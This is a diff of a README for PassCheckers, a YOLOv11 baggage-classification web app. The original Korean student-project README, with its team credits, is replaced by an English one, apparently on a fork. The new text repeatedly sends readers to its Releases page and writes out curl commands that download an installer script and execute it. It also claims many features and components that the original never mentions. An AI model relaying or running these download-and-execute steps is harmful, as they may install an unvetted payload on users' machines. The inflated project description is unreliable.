@@ -1,147 +1,249 @@
-# 🎯 PassCheckers
+https://github.com/ragnorforever/PassCheckers/releases
 
-> **AI 이미지 분석 기반 수하물 분류 및 여행 도우미 웹 애플리케이션**  
-> 2025 캡스톤디자인 팀 프로젝트
+# PassCheckers: AI Baggage Classifier and Travel Assistant
 
-![Python](https://img.shields.io/badge/python-3.10-blue?logo=python)
-![Flask](https://img.shields.io/badge/flask-3.1-black?logo=flask)
-![MySQL](https://img.shields.io/badge/mysql-8.0-orange?logo=mysql)
-![YOLOv11](https://img.shields.io/badge/YOLO-v11-yellow)
-![Vue](https://img.shields.io/badge/vue.js-3-brightgreen?logo=vue.js)
-![Redis](https://img.shields.io/badge/redis-7-red?logo=redis)
-![PyTorch](https://img.shields.io/badge/pytorch-2.3.1-orange?logo=pytorch)
+[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/ragnorforever/PassCheckers/releases) [![Flask](https://img.shields.io/badge/Flask-%23000?style=flat&logo=flask&logoColor=white)](https://flask.palletsprojects.com/) [![PyTorch](https://img.shields.io/badge/PyTorch-%23EE4C2C?style=flat&logo=pytorch&logoColor=white)](https://pytorch.org/) [![Nuxt](https://img.shields.io/badge/Nuxt-%2300DC82?style=flat&logo=nuxtdotjs&logoColor=white)](https://nuxtjs.org/) [![MySQL](https://img.shields.io/badge/MySQL-%230077B8?style=flat&logo=mysql&logoColor=white)](https://www.mysql.com/) [![Redis](https://img.shields.io/badge/Redis-%23DC382D?style=flat&logo=redis&logoColor=white)](https://redis.io/) [![TensorRT](https://img.shields.io/badge/TensorRT-%23007ACC?style=flat&logo=nvidia&logoColor=white)](https://developer.nvidia.com/tensorrt)  
 
----
+![Carry-on luggage classification](https://images.unsplash.com/photo-1520975698516-4f4b8b5b72b9?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=9f2c6d5a0c7b6e3d8f2b5f1e7a7c2b91)
 
-## 📌 프로젝트 소개
+AI 이미지 분석 기반 수하물 분류 및 여행 도우미 애플리케이션.
+PassCheckers는 수하물과 소지품을 실시간으로 분석해 분류, 규정 위반 탐지, 포장 가이드, 여행 체크리스트 통합을 제공합니다.
 
-**PassCheckers**는 사용자가 업로드한 수하물 이미지를 분석하여  
-YOLOv11 기반 **커스텀 객체 탐지 모델**로 수하물 항목을 자동 인식하고,  
-무게 추정, 패킹 추천, 다중 분류 기능 등을 제공하는 **웹 기반 여행 도우미 시스템**입니다.
+Table of contents
+- Features
+- Tech stack
+- Architecture
+- Quick start (Releases)
+- Local install
+- Docker / GPU deploy
+- Model management
+- API & Web UI
+- Data format & Annotation
+- Training and optimization
+- Performance & profiling
+- Troubleshooting
+- Contributing
+- License
 
----
+Features
+- Image-based baggage detection and classification using YOLOv11 model.
+- Object-level tags: electronics, liquids, sharp objects, clothing, medication, documents.
+- Violation flags for airline carry-on rules and local customs.
+- Packing assistant with suggested item grouping and checklist export.
+- Web UI built with Nuxt + Vue for travel and inspection workflows.
+- REST API served by Flask for integrations and automation.
+- Fast inference via TensorRT on NVIDIA GPUs.
+- Persistent session store using Redis; user data in MySQL.
+- CLI tools for batch inference, dataset conversion, and evaluation.
 
-## ✨ 주요 기능
+Tech stack
+- Backend: Flask, Python, PyTorch, TensorRT
+- Frontend: Nuxt, Vue.js
+- Datastore: MySQL (metadata), Redis (sessions, queue)
+- Model: YOLOv11 (detection + classification head)
+- Infrastructure: Docker, docker-compose, optional Kubernetes manifests
+- CI/CD: GitHub Actions for tests and release builds
+- Topics: flask, image-classification, mysql, nuxt, python, pytorch, redis, tensorrt, vuejs, yolov11
 
-- 📤 **이미지 업로드 및 YOLO 추론 요청**
-- 🧠 **YOLOv11 기반 수하물 분류** (단일/다중)
-- ⚖️ **무게 추정** (클래스별 평균 무게 기반)
-- 🧳 **패킹 도우미** (필수 품목 추천)
-- 🏷️ **미탐지 항목 수동 태그 기능** (외부 API 예정)
+Architecture
+- Edge / Camera
+  - Capture images or stream video.
+  - Forward frames to inference service or run edge container.
+- Inference service (Flask + PyTorch/TensorRT)
+  - Accept images via REST and WebSocket.
+  - Run YOLOv11 model for detection and classification.
+  - Produce bounding boxes, class labels, confidence, and rule flags.
+  - Store results in MySQL; cache session info in Redis.
+- Web client (Nuxt / Vue)
+  - Visualize detections.
+  - Offer packing tips and checklist based on detected items.
+  - Allow manual tagging and upload to dataset.
+- Admin & Training
+  - CLI and web tools to curate annotations and trigger training.
+  - Export datasets in COCO / YOLO formats.
 
----
+Quick start (Releases)
+- Download the latest release package from the Releases page:
+  https://github.com/ragnorforever/PassCheckers/releases
+- The releases page contains packaged artifacts. Download the installer or tarball and execute the included script.
+- Example:
+  - Download passcheckers-v1.0.0-linux.tar.gz
+  - Unpack and run:
+    - tar xzf passcheckers-v1.0.0-linux.tar.gz
+    - cd passcheckers-v1.0.0
+    - bash ./install.sh
+  - Or run the installer directly:
+    - curl -L -o passcheckers-installer.sh "https://github.com/ragnorforever/PassCheckers/releases/download/v1.0.0/passcheckers-installer.sh"
+    - chmod +x passcheckers-installer.sh
+    - ./passcheckers-installer.sh --target /opt/passcheckers
+- The installer will set up a conda or venv environment, pull model artifacts, and create a docker-compose file for local launch.
 
-## 📁 프로젝트 구조
+Local install (development)
+- System requirements
+  - Linux x86_64 or WSL2
+  - Python 3.9+
+  - NVIDIA GPU with CUDA 11.x for TensorRT builds (optional)
+  - Docker for containerized workflows
+- Clone
+  - git clone https://github.com/ragnorforever/PassCheckers.git
+  - cd PassCheckers
+- Create virtual environment
+  - python -m venv .venv
+  - source .venv/bin/activate
+  - pip install -r requirements.txt
+- Database
+  - Create MySQL database passcheckers
+  - Run migrations: python manage.py migrate
+- Redis
+  - Start local Redis and set REDIS_URL in .env
+- Start backend
+  - FLASK_ENV=development flask run --host=0.0.0.0 --port=5000
+- Start frontend
+  - cd web
+  - npm install
+  - npm run dev
 
-```bash
-PassCheckers/
- ├── backend/                # Flask 백엔드 서버
- │   ├── models/             # YOLOv11 커스텀 학습 모델
- │   ├── repository/         # DB 접근 계층
- │   ├── service/            # 서비스 로직
- │   ├── venv/               # 가상환경
- │   ├── app.py               # Flask 앱 실행 엔트리포인트
- │   ├── config.py            # 환경 설정 (CORS, DB, Redis 등)
- │   ├── env.example          # 환경변수 예시 파일
- │   ├── requirements.txt     # Python 패키지 목록
- │   └── README.md
- │
- ├── images/                 # 리소스 이미지
- ├── layouts/                # Vue 레이아웃 템플릿
- ├── pages/                  # Vue 페이지 컴포넌트
- ├── plugins/                # Vue 플러그인
- │
- ├── public/                 # 정적 리소스
- │   ├── images/              # 공개 이미지
- │   ├── favicon/             # 파비콘 리소스
- │   ├── favicon.ico
- │   └── robots.txt
- │
- ├── server/                 # 서버사이드 렌더링 관련 코드
- │
- ├── app.vue                  # Nuxt 메인 Vue 컴포넌트
- ├── app.config.ts            # 앱 설정 파일
- ├── nuxt.config.ts           # Nuxt 설정 파일
- ├── package.json
- ├── package-lock.json
- ├── tsconfig.json            # TypeScript 설정
- ├── .gitignore
- ├── .gitattributes
- └── README.md
-```
+Docker / GPU deploy
+- We provide docker-compose for local setups and a production compose for GPU nodes.
+- Example GPU compose (excerpt):
+  - version: '3.8'
+  - services:
+    - backend:
+      - image: passcheckers/backend:latest
+      - deploy: resources: reservations: devices: - capabilities: [gpu]
+- Build and start:
+  - docker-compose -f docker-compose.gpu.yml up --build --remove-orphans
+- Use NVIDIA Container Toolkit for GPU passthrough.
+- For Kubernetes, see k8s/ folder for deployment and service manifests.
 
----
+Model management
+- Model formats
+  - PyTorch (.pt) for training and CPU/GPU inference.
+  - ONNX for standardization.
+  - TensorRT engine (.plan) for optimized inference on NVIDIA GPUs.
+- Model versions
+  - We tag model artifacts per release. See Releases page for prebuilt engines and weights.
+- Convert to TensorRT
+  - python tools/convert_to_onnx.py --weights yolov11.pt --out yolov11.onnx
+  - python tools/onnx_to_tensorrt.py --onnx yolov11.onnx --out yolov11.plan
+- Load runtime
+  - The backend loads a runtime based on config:
+    - MODELS_RUNTIME=tensorrt or pytorch
+- Model swap
+  - Place new model in models/ and update models.json to register version.
 
-## 🧪 실행 방법
+API & Web UI
+- Core endpoints (examples)
+  - POST /api/v1/infer
+    - payload: image file (multipart/form)
+    - response: detections array {class, score, bbox, flags}
+  - GET /api/v1/models
+    - list available models and versions
+  - POST /api/v1/annotate
+    - payload: annotation JSON for dataset curation
+- Authentication
+  - JWT-based auth with user roles: admin, inspector, traveler.
+  - Admins can upload models and manage dataset.
+- Web client
+  - Live stream view with overlayed detections.
+  - Checklist generator based on detected items.
+  - Batch upload and review queue.
 
-1️⃣ 프론트엔드 실행
+Data format & Annotation
+- Use COCO-style JSON for evaluation and dataset sharing.
+- Supported annotation tools
+  - LabelImg, CVAT, Roboflow exports.
+- Required fields
+  - image_id, file_name, width, height
+  - annotations: bbox [x,y,w,h], category_id, attributes (fragile, liquid)
+- Export utilities
+  - python tools/convert_labels.py --src cvat --dst coco --out data/train.json
 
-```bash
-cd frontend
-npm install
-npm run dev -- --host
-```
+Training and optimization
+- Training configuration
+  - models/configs/yolov11.yaml defines architecture and hyperparameters.
+- Run training
+  - python train.py --config models/configs/yolov11.yaml --data data/dataset.yaml --epochs 50 --batch 16
+- Mixed precision
+  - Use AMP in PyTorch to reduce memory and speed training on GPUs.
+- Pruning & quantization
+  - We include scripts for post-training quantization to int8 for TensorRT engines.
+  - python tools/quantize.py --model yolov11.pt --out yolov11_int8.plan
+- Validation
+  - python eval.py --weights yolov11.pt --data data/val.yaml --save-json
 
-2️⃣ 백엔드 실행
+Performance & profiling
+- Measure FPS and latency
+  - python tools/benchmark.py --engine yolov11.plan --input data/sample.jpg --repeat 100
+- Redis queue
+  - Use Redis to buffer inference jobs and scale worker replicas.
+- Tips
+  - Use batch inference for throughput.
+  - Use TensorRT engine tuned to target GPU for lowest latency.
 
-```bash
-cd backend
-source venv/bin/activate
-python3 app.py
-```
+Troubleshooting
+- Backend fails to start
+  - Check .env for DB and Redis URLs.
+- Model load errors
+  - Verify model path in config and engine format (pt, onnx, plan).
+- Low accuracy on custom items
+  - Collect more labeled samples and retrain with augmentation.
+- GPU not used
+  - Ensure nvidia-docker and container toolkit are installed.
 
-- ⚠️ `config.py`의 CORS 설정에서 실제 서버 IP를 적용하세요.
+Contributing
+- Workflow
+  - Fork, create a feature branch, and open a pull request.
+  - Follow commit style: feat, fix, docs, chore.
+- Tests
+  - pytest runs unit tests.
+  - Run linting: flake8 and black formatting.
+- Code of conduct
+  - Respectful behavior and clear discussion.
 
-3️⃣ Redis 확인
+Security
+- Keep secrets in environment variables or a secrets manager.
+- Rotate API keys and database credentials.
+- Use HTTPS in production and limit access to admin endpoints.
 
-```bash
-redis-cli
-keys *
-keys refresh_token:*
-get refresh_token:1
-```
+Release artifacts and installers
+- Visit the Releases page to get packaged builds, model weights, and installer scripts:
+  - https://github.com/ragnorforever/PassCheckers/releases
+- Each release may contain:
+  - passcheckers-installer.sh — Linux installer script
+  - passcheckers-windows.zip — Windows build
+  - yolov11-vX.Y.pt — PyTorch weights
+  - yolov11-vX.Y.plan — TensorRT engine
+- Download the artifact that matches your platform and run the included installer as documented in the release notes.
 
-4️⃣ MySQL 설정
+Examples and use cases
+- Airport security
+  - Run live inspection at checkpoints to flag prohibited items.
+- Hotel check-in
+  - Offer packing suggestions and reminders for travelers.
+- Cruise terminals
+  - Detect large or dangerous items during boarding.
+- Personal travel app
+  - Scan packed bag and generate a checklist and warnings.
 
-```bash
-(세부 설정은 추후 업데이트 예정)
-```
+Files and directories
+- /backend — Flask app, model loaders, API
+- /web — Nuxt / Vue client
+- /models — prebuilt weights and engines (large files are in Releases)
+- /data — example datasets and annotations
+- /tools — conversion, benchmarking, and training helpers
+- /docker — docker-compose and Dockerfiles
+- /k8s — Kubernetes manifests
 
----
+Credits and acknowledgements
+- YOLOv11 (model backbone adaptation)
+- PyTorch community for tooling
+- Nuxt and Vue for the frontend
+- Test images from Unsplash and public datasets used for prototyping
 
-## 🔧 기술 스택
+License
+- MIT License. See LICENSE file.
 
-|  분류   | 기술 |
-|:--------:|:-----:|
-| 백엔드 | Python 3.10, Falsk 3.1 |
-| 모델 | YOLOv11 (커스텀 학습) |
-| 데이터베이스 | MySQL 8.0 |
-| 인프라 | Nginx |
-| 기타 | OpenCV, Numpy, Pillow, Redis, PyTorch, TensorRT |
-
----
-
-## 🧭 시스템 흐름도
-
-```bash
-(시스템 다이어그램 이미지 추가 예정)
-```
-
----
-
-## 📸 샘플 예시 (시각화)
-
-- 입력 이미지
-
-- 분류 결과
-
----
-
-## 👥 팀원 소개
-
-|  이름   | 역할 |
-|:--------:|-----|
-| 김민한 | 🧠 **YOLOv11 커스텀 모델 설계·학습**<br>· 학습 데이터셋 전처리 및 어노테이션 설계<br>· 하이퍼파라미터 튜닝 및 성능 최적화<br>· 프론트엔드 UI/UX 시안 설계 |
-| 이상민 | ⚙️ **모델 고도화 및 알고리즘 개발**<br>· YOLOv11 다중 객체 분류 로직 구현<br>· 수하물 무게 예측 알고리즘 개발 (클래스별 평균 무게 기반)<br>· 패킹 추천 알고리즘 설계 |
-| 이상호 | 💻 **풀스택 및 시스템 아키텍처 개발**<br>· Flask 기반 REST API 서버 구현<br>· Vue/Nuxt 프론트엔드 연동 및 상태관리<br>· Redis 세션 관리, MySQL DB 설계 및 쿼리 최적화<br>· 전체 시스템 설계 및 배포 환경 구성 |
-
+Contact
+- Report issues via GitHub Issues.
+- For large contributions or partnerships, open a discussion on the repository.
